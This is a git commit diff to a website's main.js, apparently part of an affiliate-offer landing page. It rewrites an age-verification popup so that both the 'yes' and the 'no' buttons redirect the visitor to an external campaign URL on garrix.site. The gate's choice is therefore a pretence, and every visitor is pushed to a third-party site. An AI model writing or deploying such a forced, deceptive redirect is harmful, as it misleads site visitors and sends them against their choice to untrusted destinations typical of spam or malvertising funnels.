2646bff5d07aa6cafce247b18f791d15e3ee84df
fresoffers4u <niafalls86@gmail.com>
2026-02-05 21:44:28 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -84,14 +84,13 @@ if(form){
   </div>`;
   document.body.appendChild(bd);
   bd.style.display='flex';
-
-  function close(){
-    bd.style.display='none';
-    bd.remove();
-  }
-
-  const yes=bd.querySelector('#age-yes');
-  const no=bd.querySelector('#age-no');
-  if(yes) yes.addEventListener('click',close);
-  if(no) no.addEventListener('click',close);
+  function closeGate(){ bd.style.display='none'; bd.remove(); }
+  bd.querySelector('#age-yes').addEventListener('click', function(){
+    window.location.href = "http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+                                                
+  bd.querySelector('#age-no').addEventListener('click', function(){
+    window.location.href = "http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
+
